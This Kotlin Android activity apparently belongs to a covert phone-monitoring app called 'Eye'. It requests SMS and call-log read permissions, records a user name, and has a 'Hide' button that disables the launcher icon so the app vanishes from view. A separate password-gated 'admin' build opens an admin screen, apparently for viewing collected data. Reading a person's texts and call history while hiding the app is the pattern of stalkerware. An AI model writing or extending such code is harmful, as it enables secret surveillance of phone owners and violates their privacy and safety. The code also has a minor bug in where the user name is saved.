package com.eye

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.height
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextField
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import androidx.hilt.navigation.compose.hiltViewModel
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.eye.data.local.Preference
import com.eye.screen.admin.AdminScreen
import com.eye.screen.admin.AdminViewModel
import com.eye.ui.theme.EyeTheme
import com.eye.utils.PermissionDialog
import com.eye.utils.PhoneCallPermissionTextProvider
import com.eye.utils.SMSPermissionTextProvider
import dagger.hilt.android.AndroidEntryPoint


@AndroidEntryPoint
class MainActivity : ComponentActivity() {
    @OptIn(ExperimentalMaterial3Api::class)
    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            EyeTheme {
                val viewModel = hiltViewModel<MainViewModel>()
                val dialogQueue = viewModel.visiblePermissionDialogQueue
                val preference: Preference = Preference(this)
                // A surface container using the 'background' color from the theme
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    val multiplePermissionResultLauncher = rememberLauncherForActivityResult(
                        contract = ActivityResultContracts.RequestMultiplePermissions(),
                        onResult = {perms ->
                            perms.keys.forEach { permission ->
                                viewModel.onPermissionResult(
                                    permission = permission,
                                    isGranted = perms[permission] == true
                                )
                            }
                        }
                    )

                    var approve by remember {
                        mutableStateOf(false)
                    }
                    var password by remember {
                        mutableStateOf("")
                    }
                    var user by remember {
                        mutableStateOf("")
                    }
                    var showAlertDialog by remember {
                        mutableStateOf(false)
                    }
                    if (showAlertDialog){
                        AlertDialog(
                            onDismissRequest = {
                                showAlertDialog = false }) {
                            Column {
                                Text(text = "New user : $user")
                                Button(onClick = { showAlertDialog = false }) {
                                    Text(text = "Okay")
                                }
                            }


                        }
                    }
                    if (BuildConfig.BUILD_TYPE == "admin") {

                        if (!approve) {
                            Column(
                                modifier = Modifier
                                    .fillMaxSize(),
                                horizontalAlignment = Alignment.CenterHorizontally,
                                verticalArrangement = Arrangement.Center
                            ) {
                                Text(text = "Eye")
                                Spacer(modifier = Modifier.height(50.dp))
                                TextField(
                                    value = password,
                                    onValueChange = {
                                        password = it
                                    },
                                    placeholder = {
                                        Text(text = "Password")
                                    }
                                )
                                Button(onClick = {
                                    approve = BuildConfig.Password == password
                                }) {
                                    Text(text = "I am admin")
                                }
                            }
                        }
                        if (approve) {
                            val navController = rememberNavController()
                            NavHost(
                                navController = navController,
                                startDestination = Destination.Screen.AdminScreen.route
                            ) {
                                composable(Destination.Screen.AdminScreen.route) {
                                    val viewModel = hiltViewModel<AdminViewModel>()
                                    AdminScreen(
                                        onEvent = viewModel.onEvent,
                                        state = viewModel.state.collectAsStateWithLifecycle().value
                                    )

                                }
                            }

                        }
                    } else {
                        Column {
                            Button(onClick = {
                                multiplePermissionResultLauncher.launch(
                                    arrayOf(
                                        Manifest.permission.READ_SMS,
                                        Manifest.permission.READ_CALL_LOG
                                    )
                                )
                            }) {
                                Text(text = "Multiple Permission")
                            }
                            TextField(
                                value = user ,
                                onValueChange = {
                                    user = it
                                })
                            Button(onClick = {
                                showAlertDialog = true
                            }) {
                            preference.userNmae = user
                        }
                            Button(onClick = {
                                val p: PackageManager = packageManager
                                val componentName = ComponentName(
                                    this@MainActivity,
                                    MainActivity::class.java
                                ) // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />

                                p.setComponentEnabledSetting(
                                    componentName,
                                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                    PackageManager.DONT_KILL_APP
                                )
                            }) {
                                Text(text = "Hide")
                            }
                        }

                        dialogQueue
                            .reversed()
                            .forEach { permission ->
                                PermissionDialog(
                                    permissionTextProvider = when (permission) {
                                        Manifest.permission.READ_SMS -> {
                                            SMSPermissionTextProvider()
                                        }
                                        Manifest.permission.READ_CALL_LOG -> {
                                            PhoneCallPermissionTextProvider()
                                        }
                                        else -> return@forEach

                                    },
                                    isPermissionDeclined = !shouldShowRequestPermissionRationale(
                                        permission
                                    ),
                                    onDismiss = viewModel::dismissDialog,
                                    onOkClick = {
                                               viewModel.dismissDialog()
                                        multiplePermissionResultLauncher.launch(
                                            arrayOf(permission)
                                        )
                                    },
                                    onGoToAppSettingsClick = ::openAppSettings)
                            }

                    }
                }
            }
        }
    }
}

fun Activity.openAppSettings(){
    Intent(
        Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
        Uri.fromParts("package", packageName, null)
    ).also(::startActivity)
}

